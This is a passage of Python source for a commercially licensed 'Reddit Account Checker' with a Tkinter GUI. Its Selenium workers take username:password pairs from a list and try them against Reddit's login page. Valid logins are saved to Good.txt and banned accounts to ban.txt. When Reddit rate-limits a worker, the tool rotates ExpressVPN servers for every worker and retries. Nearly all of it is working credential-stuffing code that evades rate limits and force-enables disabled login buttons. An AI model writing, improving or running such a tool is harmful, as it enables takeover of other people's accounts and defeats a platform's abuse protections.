    def check_if_logged_in(self, driver):
        try:
            try:
                is_logged_in = driver.execute_script(JS_CHECK_LOGGED_IN)
                return bool(is_logged_in)
            except:
                pass
            
            current_url = driver.current_url.lower()
            page_src = driver.page_source.lower()
            
            if "www.reddit.com" in current_url and "/login" not in current_url:
                logged_in_indicators = [
                    "user menu",
                    "create post",
                    "submit",
                    "inbox",
                    "messages",
                    "profile",
                    "avatar"
                ]
                
                for indicator in logged_in_indicators:
                    if indicator in page_src:
                        return True
                
                try:
                    logout_elements = driver.find_elements(By.XPATH, "//a[contains(@href, '/logout')]")
                    if logout_elements:
                        return True
                except:
                    pass
            
            return False
                
        except Exception as e:
            return False

    def handle_rate_limit(self, username, password, retries):
        """Handle rate limit - ANY rate limit triggers VPN change"""
        global success_detected_flag
        
        # Check if success was detected - if yes, NO VPN CHANGE
        if success_detected_flag and DISABLE_VPN_ON_SUCCESS:
            self.log(f"⚠️ VPN change disabled (successful login detected)", "warning")
            return True
        
        self.log(f"🔄 RATE LIMIT DETECTED!", "vpn")
        
        with stats_lock:
            stats["rate_limits"] += 1
        
        # Rotate VPN for ALL workers when ANY worker hits rate limit
        self.log(f"⚠️ Worker {self.idx} hit rate limit - Rotating VPN for ALL workers", "vpn")
        new_server = rotate_vpn_for_all_workers(self.idx, lambda msg, tag="vpn": self.log(msg, tag))
        
        # Clear browser and retry
        try:
            self.driver.delete_all_cookies()
            self.driver.execute_script("localStorage.clear(); sessionStorage.clear();")
            self.driver.get("https://www.reddit.com/login/")
            time.sleep(2)
        except Exception as e:
            self.log(f"⚠️ Browser clear error: {e}", "warning")
        
        # Re-queue account for retry
        accounts_q.put({"cred": f"{username}:{password}", "retries": retries + 1})
        self.log(f"✅ Account [{username}] re-queued for retry with new VPN: {new_server}", "success")
        
        return True

    def handle_banned_account(self, username, password):
        """Handle banned/locked accounts - save to ban.txt - NO WAITING"""
        try:
            self.log(f"🚫 BANNED/LOCKED ACCOUNT DETECTED: [{username}]", "banned")
            
            ban_entry = f"{username}:{password}"
            append_file_text(BAN_FILE, ban_entry)
            
            with stats_lock:
                stats["banned"] += 1
            
            # NO WAITING - IMMEDIATE LOGOUT
            self.perform_logout(self.driver)
            
            # Remove from Accounts.txt
            remove_account_from_file(username, password)
            self.account_checked = True
            
            self.log(f"✅ Banned account saved to ban.txt and removed from Accounts.txt", "success")
            return True
            
        except Exception as e:
            self.log(f"❌ Error handling banned account: {e}", "error")
            return False

    def handle_good_account(self, username, password):
        """Handle successful login - NO VPN CHANGE - Save to Good.txt"""
        global success_detected_flag
        
        try:
            # Set global success flag to prevent VPN changes
            success_detected_flag = True
            
            self.log(f"✅ LOGIN SUCCESSFUL for: [{username}]", "success")
            
            # WAIT 5 SECONDS AFTER LOGIN (সবসময়)
            self.log(f"⏳ Waiting {LOGIN_SUCCESS_WAIT} seconds after login...", "info")
            time.sleep(LOGIN_SUCCESS_WAIT)
            
            # Check if actually on Reddit homepage
            if not self.is_reddit_homepage(self.driver):
                self.log(f"⚠️ Not on Reddit homepage, checking if logged in...", "warning")
                
                if not self.check_if_logged_in(self.driver):
                    self.log(f"❌ Not actually logged in: [{username}] -> Bad.txt", "error")
                    append_file_text(BAD_FILE, f"{username}:{password}")
                    with stats_lock:
                        stats["failed"] += 1
                    remove_account_from_file(username, password)
                    self.account_checked = True
                    success_detected_flag = False
                    return False
            
            # Check for ban messages
            ban_detected = self.check_for_ban_on_homepage(self.driver)
            
            if ban_detected:
                # এটা Good.txt-এ যাবে না, Ban.txt-এ যাবে
                result = self.handle_banned_account(username, password)
                success_detected_flag = False
                return result
            else:
                # Save good account - শুধুমাত্র যদি ban না থাকে
                self.save_good_account(username, password)
                
                # NO WAITING - IMMEDIATE LOGOUT
                self.perform_logout(self.driver)
                
                # Remove from Accounts.txt
                remove_account_from_file(username, password)
                
                self.log(f"✅ Good account saved and logged out: [{username}]", "success")
                
                return True
                
        except Exception as e:
            self.log(f"❌ Error handling good account: {e}", "error")
            success_detected_flag = False
            return False

    def attempt_login(self, username, password, retries):
        d = self.driver
        
        if not self.login_page_ready:
            self.log("⚠️ Login page not ready yet - waiting...", "warning")
            d.get("https://www.reddit.com/login/")
            time.sleep(5)
            self.login_page_ready = True
        
        # Log format
        if "@" in username:
            self.log(f"Checking Email/{username} With ExpressVPN", "orange")
        else:
            self.log(f"Checking username/{username} With ExpressVPN", "orange")
        
        try:
            current_url = d.current_url.lower()
            if "login" not in current_url and not self.is_login_page_ready(d):
                self.log("🔄 Not on login page, navigating...", "vpn")
                d.execute_script("window.location.href = 'https://www.reddit.com/login/';")
                time.sleep(3)

            self.log("login page Loaded Successfully .", "yellow")
            
            page_src_before = (d.page_source or "").lower()
            
            already_logged_in_detected = False
            for text in ALREADY_LOGGED_IN_STRINGS:
                if text in page_src_before:
                    already_logged_in_detected = True
                    break

            if already_logged_in_detected:
                return self.handle_already_logged_in(username, password)

            user_selectors = [
                "input[name='username']",
                "input[autocomplete='username']",
                "input#loginUsername",
                "input[name='user']"
            ]
            pass_selectors = [
                "input[name='password']",
                "input[type='password']",
                "input[autocomplete='current-password']",
                "input[name='passwd']"
            ]

            # Clear any existing values
            try:
                d.execute_script("""
                    var inputs = document.querySelectorAll('input[type=\"text\"], input[type=\"password\"]');
                    for (var i = 0; i < inputs.length; i++) {
                        inputs[i].value = '';
                    }
                """)
            except:
                pass

            user_ok = pass_ok = False
            try:
                res = d.execute_script(JS_FILL_TEMPLATE, user_selectors, username, pass_selectors, password)
                if isinstance(res, dict):
                    user_ok = bool(res.get("userOK", False))
                    pass_ok = bool(res.get("passOK", False))
            except Exception as e:
                self.log(f"JS fill error: {e}", "warning")
                user_ok = pass_ok = False

            if not user_ok or not pass_ok:
                # Fallback: Manual typing
                try:
                    for sel in user_selectors:
                        try:
                            el = d.find_element(By.CSS_SELECTOR, sel)
                            el.clear()
                            el.send_keys(username)
                            user_ok = True
                            break
                        except:
                            continue
                    for sel in pass_selectors:
                        try:
                            el = d.find_element(By.CSS_SELECTOR, sel)
                            el.clear()
                            el.send_keys(password)
                            pass_ok = True
                            break
                        except:
                            continue
                except Exception as e:
                    self.log(f"Fallback typing error: {e}", "warning")

            if not user_ok or not pass_ok:
                self.log(f"❌ Cannot fill login form: [{username}]", "error")
                return self.handle_invalid_credentials(username, password)

            # Enable any disabled buttons
            try:
                d.execute_script(JS_FORCE_ENABLE)
            except Exception:
                pass

            clicked = False
            try:
                clicked = bool(d.execute_script(JS_CLICK_LOGIN))
            except Exception as e:
                self.log(f"JS click attempt error: {e}", "warning")
                clicked = False

            time.sleep(4.0)

            page_src = (d.page_source or "").lower()
            current_url = (d.current_url or "").lower()

            # Check for extension error
            extension_error_detected = False
            for err in EXTENSION_ERROR_STRINGS:
                if err in page_src:
                    extension_error_detected = True
                    break

            if extension_error_detected:
                return self.handle_extension_error(username, password)

            # Check for already logged in after login attempt
            already_logged_in_detected_after = False
            for text in ALREADY_LOGGED_IN_STRINGS:
                if text in page_src:
                    already_logged_in_detected_after = True
                    break

            if already_logged_in_detected_after:
                return self.handle_already_logged_in(username, password)

            # Check for invalid credentials
            invalid_detected = False
            for inv in INVALID_STRINGS:
                if inv in page_src:
                    invalid_detected = True
                    break

            if invalid_detected:
                return self.handle_invalid_credentials(username, password)

            # Check for rate limit
            rate_limit_detected = self.check_for_rate_limit(page_src)
            if rate_limit_detected:
                return self.handle_rate_limit(username, password, retries)

            # Check if we're on Reddit homepage (successful login)
            if self.is_reddit_homepage(d):
                # SUCCESS LOG - NO VPN CHANGE
                if "@" in username:
                    self.log(f"Successful Email/{username} With ExpressVPN Save From Good.txt", "success")
                else:
                    self.log(f"Successful Username/{username} With ExpressVPN Save From Good.txt", "success")
                return self.handle_good_account(username, password)
            else:
                # Check if logged in but not on homepage
                if self.check_if_logged_in(d):
                    # Still logged in, save as good account
                    if "@" in username:
                        self.log(f"Successful Email/{username} With ExpressVPN Save From Good.txt", "success")
                    else:
                        self.log(f"Successful Username/{username} With ExpressVPN Save From Good.txt", "success")
                    return self.handle_good_account(username, password)
                else:
                    self.log(f"❌ Login Failed: [{username}]", "error")
                    return self.handle_invalid_credentials(username, password)

        except TimeoutException:
            self.log(f"❌ Timeout Error: [{username}]", "error")
            return self.handle_invalid_credentials(username, password)
        except WebDriverException as e:
            self.log(f"❌ WebDriver Error: [{username}]", "error")
            return self.handle_invalid_credentials(username, password)
        except Exception as e:
            self.log(f"❌ General Error: [{e}]", "error")
            return self.handle_invalid_credentials(username, password)

# ---------------- GUI Application ----------------
class RedditCheckerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("🚀 Reddit Account Checker - PixelIQ")
        self.root.geometry("1100x800")
        self.root.resizable(False, False)
        
        self.root.configure(bg=DARK_BG)
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self._configure_rgb_theme()
        
        self.workers = []
        self.is_running = False
        self.last_progress_log_time = 0
        
        # Check license before showing GUI
        global license_valid
        license_valid, license_message = check_license_system()
        
        self._build_gui()
        
        # Show license status
        if license_valid:
            self.log(f"✅ License Status: {license_message}", "success")
        else:
            self.log(f"⚠️ License Status: {license_message}", "warning")
    
    def _configure_rgb_theme(self):
        self.style.configure('.', background=DARK_BG, foreground=DARK_FG)
        self.style.configure('TFrame', background=DARK_BG)
        self.style.configure('TLabel', background=DARK_BG, foreground=DARK_FG)
        self.style.configure('TButton', background=DARK_BG3, foreground=DARK_FG, borderwidth=0)
        self.style.configure('TLabelframe', background=DARK_BG, foreground=ACCENT_COLOR)
        self.style.configure('TLabelframe.Label', background=DARK_BG, foreground=ACCENT_COLOR)
        
        self.style.map('TButton', 
                      background=[('active', '#3a3a3a'), ('pressed', '#4a4a4a')],
                      foreground=[('active', ACCENT_COLOR)])

    def _build_gui(self):
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Header with license info
        header_frame = tk.Frame(main_frame, bg=DARK_BG)
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        # License status in header
        license_status_text = f"License: {'✅ Valid' if license_valid else '❌ Invalid'} | Owner: {device_owner}"
        license_label = tk.Label(header_frame, text=license_status_text,
                               bg=DARK_BG, 
                               fg=LICENSE_VALID_COLOR if license_valid else LICENSE_INVALID_COLOR,
                               font=("Arial", 9, "bold"))
        license_label.pack(side=tk.LEFT)
        
        # Contact info
        contact_label = tk.Label(header_frame,
                                text="Contacts: https://t.me/jahid_hasanShuvo",
                                font=("Arial", 9),
                                bg=DARK_BG,
                                fg=ACCENT_COLOR,
                                cursor="hand2")
        contact_label.pack(side=tk.RIGHT)
        contact_label.bind("<Button-1>", lambda e: webbrowser.open("https://t.me/jahid_hasanShuvo"))

        # Main title
        title = tk.Label(main_frame, 
                        text="🚀 REDDIT ACCOUNT CHECKER — PixelIQ", 
                        font=("Arial", 16, "bold"),
                        bg=DARK_BG, 
                        fg=ACCENT_COLOR)
        title.pack(pady=6)

        # Stats frame
        stats_frame = tk.Frame(main_frame, bg=DARK_BG2, relief=tk.RAISED, bd=1)
        stats_frame.pack(fill=tk.X, pady=6, padx=2)

        # Stats labels
        self.stats_vars = {}
        stats_grid = [
            ("Total:", "total", DARK_FG),
            ("Success:", "success", SUCCESS_COLOR),
            ("Ban:", "banned", BAN_COLOR),
            ("Incorrect:", "failed", ERROR_COLOR),
            ("Processing:", "processing", PROCESSING_COLOR),
            ("Rate Limits:", "rate_limits", VPN_COLOR),
            ("Progress:", "progress", INFO_COLOR)
        ]
        
        for i, (text, key, color) in enumerate(stats_grid):
            frame = tk.Frame(stats_frame, bg=DARK_BG2)
            frame.grid(row=0, column=i, padx=10, pady=8)
            
            tk.Label(frame, text=text, bg=DARK_BG2, fg=DARK_FG, 
                    font=("Arial", 9, "bold")).pack(anchor="w")
            
            self.stats_vars[key] = tk.StringVar(value="0")
            value_label = tk.Label(frame, textvariable=self.stats_vars[key], 
                                 bg=DARK_BG2, fg=color, font=("Arial", 11, "bold"))
            value_label.pack(anchor="w")

        # Control buttons
        control_frame = tk.Frame(main_frame, bg=DARK_BG)
        control_frame.pack(fill=tk.X, pady=12)

        # Start button (enabled/disabled based on license)
        start_state = tk.NORMAL if license_valid else tk.DISABLED
        start_bg = SUCCESS_COLOR if license_valid else DARK_BG3
        
        self.start_btn = tk.Button(control_frame,
                                 text="▶ START",
                                 command=self.start,
                                 font=("Arial", 10, "bold"),
                                 width=20,
                                 height=2,
                                 relief=tk.RAISED,
                                 bd=2,
                                 bg=start_bg,
                                 fg="black" if license_valid else DARK_FG,
                                 activebackground="#00cc66",
                                 activeforeground="white",
                                 state=start_state)
        self.start_btn.pack(side=tk.LEFT, padx=8)

        # Stop button
        self.stop_btn = tk.Button(control_frame,
                                text="⏹ STOP",
                                command=self.stop,
                                font=("Arial", 10, "bold"),
                                width=20,
                                height=2,
                                relief=tk.RAISED,
                                bd=2,
                                bg=ERROR_COLOR,
                                fg="white",
                                activebackground="#cc0000",
                                activeforeground="white",
                                state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=8)

        # Log frame
        log_frame = tk.LabelFrame(main_frame,
                                text=" Live Log ",
                                bg=DARK_BG,
                                fg=ACCENT_COLOR,
                                font=("Arial", 10, "bold"),
                                relief=tk.GROOVE,
                                bd=2)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=8)

        # Log text area
        self.log_box = scrolledtext.ScrolledText(log_frame,
                                               height=28,
                                               bg=DARK_BG2,
                                               fg=DARK_FG,
                                               insertbackground=DARK_FG,
                                               selectbackground=DARK_BG3,
                                               font=("Consolas", 9),
                                               relief=tk.FLAT,
                                               bd=0)
        self.log_box.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)

        # Configure text tags for colors
        self._setup_text_tags()

    def _setup_text_tags(self):
        self.log_box.tag_config("orange", foreground=ORANGE_COLOR)
        self.log_box.tag_config("yellow", foreground=YELLOW_COLOR)
        self.log_box.tag_config("red", foreground=RED_COLOR)
        self.log_box.tag_config("green", foreground=GREEN_COLOR)
        self.log_box.tag_config("success", foreground=SUCCESS_COLOR)
        self.log_box.tag_config("error", foreground=ERROR_COLOR)
        self.log_box.tag_config("warning", foreground=WARNING_COLOR)
        self.log_box.tag_config("banned", foreground=BAN_COLOR)
        self.log_box.tag_config("vpn", foreground=VPN_COLOR)
        self.log_box.tag_config("info", foreground=INFO_COLOR)
        self.log_box.tag_config("normal", foreground=DARK_FG)

    def log(self, msg, color_tag="normal"):
        ts = time.strftime("%H:%M:%S")
        
        # Apply color based on message content
        if "Checking username" in msg or "Checking Email" in msg:
            color_tag = "orange"
        elif "login page Loaded Successfully" in msg:
            color_tag = "yellow"
        elif "Connecting ExpressVPN" in msg or "Disconnecting ExpressVPN" in msg or "incorrect username or password" in msg:
            color_tag = "red"
        elif "Connected Successfully" in msg or "Successful" in msg:
            color_tag = "green"
        elif "RATE LIMIT DETECTED" in msg:
            color_tag = "vpn"
        elif "BANNED" in msg:
            color_tag = "banned"
        
        self.log_box.insert(tk.END, f"[{ts}] {msg}\n", color_tag)
        self.log_box.see(tk.END)
        self.root.update_idletasks()

    def update_stats(self):
        with stats_lock:
            for key in ["total", "success", "banned", "failed", "processing", "rate_limits"]:
                if key in self.stats_vars:
                    self.stats_vars[key].set(str(stats.get(key, 0)))
            
            processed = stats["success"] + stats["failed"] + stats["banned"]
            total = stats["total"]
            progress_text = f"{processed}/{total}"
            self.stats_vars["progress"].set(progress_text)
        
        if self.is_running:
            with stats_lock:
                processed = stats["success"] + stats["failed"] + stats["banned"]
                total = stats["total"]
                elapsed = time.time() - stats["start_time"]
                minutes = elapsed / 60 if elapsed > 0 else 1
                cpm = int(processed / minutes) if minutes > 0 else 0
            
            self.root.title(f"🚀 Reddit Checker - Total: {total} | ✅:{stats['success']} 🚫:{stats['banned']} ❌:{stats['failed']} 🔄:{stats['processing']} | CPM: {cpm}")
            self.root.after(1000, self.update_stats)

    def start(self):
        global bot_running, global_rate_limit_detected, rate_limit_counter, success_detected_flag
        
        if not license_valid:
            messagebox.showerror("License Required", "Valid license key required to start!")
            return
            
        if self.is_running:
            messagebox.showinfo("Running", "Already running")
            return

        accounts = read_accounts()
        if not accounts:
            messagebox.showwarning("No accounts", f"No accounts in {ACCOUNTS_FILE}")
            return

        while not accounts_q.empty():
            accounts_q.get_nowait()
        
        for a in accounts:
            accounts_q.put(a)
        
        with stats_lock:
            stats["total"] = len(accounts)
            stats["start_time"] = time.time()
            stats["success"] = 0
            stats["failed"] = 0
            stats["banned"] = 0
            stats["rate_limits"] = 0
            stats["vpn_changes"] = 0
            stats["extension_errors"] = 0
            stats["already_logged_in"] = 0
            stats["processing"] = 0

        global_rate_limit_detected = False
        rate_limit_event.clear()
        active_workers.clear()
        
        # Reset flags
        global rate_limit_detected_flag, vpn_rotation_in_progress
        rate_limit_detected_flag = False
        vpn_rotation_in_progress = False
        success_detected_flag = False  # Reset success flag

        # Reset VPN manager state
        vpn_manager.set_disable_vpn_change(False)
        global current_vpn_server_index
        current_vpn_server_index = 0

        self.is_running = True
        bot_running = True
        self.start_btn.config(state=tk.DISABLED, bg=DARK_BG3, fg=DARK_FG)
        self.stop_btn.config(state=tk.NORMAL, bg=ERROR_COLOR, fg="white")
        
        self.log_box.delete(1.0, tk.END)
        self.log("🚀 Starting Reddit Account Checker...", "info")
        self.log(f"📊 Total Accounts: {len(accounts)}", "info")
        self.log(f"👥 Workers: {MAX_BROWSERS}", "info")
        self.log(f"🔧 VPN Change on Rate Limit: Enabled", "info")
        self.log(f"🔧 VPN Change on Success: DISABLED", "info")
        self.log(f"⏳ Login success wait: {LOGIN_SUCCESS_WAIT} seconds", "info")

        # Initial VPN connection
        if VPN_ENABLED:
            self.log("🔌 Connecting ExpressVPN", "red")
            ok = connect_vpn_initial(gui_log=self.log)
            if ok:
                self.log("✅ Connected Successfully", "green")
            else:
                self.log("❌ VPN connection failed — continuing without VPN", "error")

        # Start workers
        worker_count = min(MAX_BROWSERS, max(1, stats["total"]))
        self.workers = []
        for i in range(worker_count):
            w = Worker(i+1, gui_logger=self.log)
            self.workers.append(w)
            w.start()
            time.sleep(0.3)

        self.update_stats()
        threading.Thread(target=self._monitor_workers, daemon=True).start()

    def _monitor_workers(self):
        while self.is_running and any(w.is_alive() for w in self.workers):
            vpn_manager.wait_if_paused()
            
            time.sleep(2)
            
            with stats_lock:
                processing_count = len(active_workers)
                stats["processing"] = processing_count
                
                processed = stats["success"] + stats["failed"] + stats["banned"]
                total = stats["total"]
                elapsed = time.time() - stats["start_time"]
                minutes = elapsed / 60 if elapsed > 0 else 1
                cpm = int(processed / minutes) if minutes > 0 else 0
            
            current_time = time.time()
            if current_time - self.last_progress_log_time >= 5:
                self.last_progress_log_time = current_time
                self.log(f"📊 Progress: {processed}/{total} | CPM: {cpm} | Active Workers: {processing_count}", "info")
            
        self.is_running = False
        self.start_btn.config(state=tk.NORMAL, bg=SUCCESS_COLOR, fg="black")
        self.stop_btn.config(state=tk.DISABLED, bg=DARK_BG3, fg=DARK_FG)
        self.log("✅ Processing completed", "success")
        self.update_stats()
        self.root.title("🚀 Reddit Account Checker - PixelIQ [Completed]")

    def stop(self):
        global bot_running, success_detected_flag
        if not self.is_running:
            return
            
        bot_running = False
        self.is_running = False
        success_detected_flag = False  # Reset success flag
        self.start_btn.config(state=tk.NORMAL, bg=SUCCESS_COLOR, fg="black")
        self.stop_btn.config(state=tk.DISABLED, bg=DARK_BG3, fg=DARK_FG)
        self.log("🛑 Stop requested — closing bot...", "warning")
        
        for w in self.workers:
            if w.is_alive():
                try:
                    if w.driver:
                        w.driver.quit()
                except:
                    pass

        if VPN_ENABLED:
            self.log("🔌 Disconnecting ExpressVPN", "red")
            run_cmd(VPN_DISCONNECT_CMD)
            self.log("✅ VPN disconnected", "success")

        self.log("✅ Bot closed successfully", "success")
        self.root.title("🚀 Reddit Account Checker - PixelIQ [Stopped]")

# ---------------- Entry point ----------------
def main():
    if not os.path.exists(GECKO_PATH):
        error_msg = f"❌ geckodriver not found at {GECKO_PATH}.\nPlease download geckodriver from:\nhttps://github.com/mozilla/geckodriver/releases\nAnd place it in: {os.path.dirname(GECKO_PATH)}"
        messagebox.showerror("Error", error_msg)
        print(error_msg)
        return
    
    global license_valid, device_owner
    license_valid, license_message = check_license_system()
    
    root = tk.Tk()
    app = RedditCheckerApp(root)
    
    if not license_valid:
        messagebox.showwarning("License Warning", 
                             f"License not valid: {license_message}\n\nPlease enter a valid license key.\nContact: https://t.me/jahid_hasanShuvo")
    
    root.protocol("WM_DELETE_WINDOW", lambda: (app.stop(), root.destroy()))
    root.mainloop()

if __name__ == "__main__":
    main()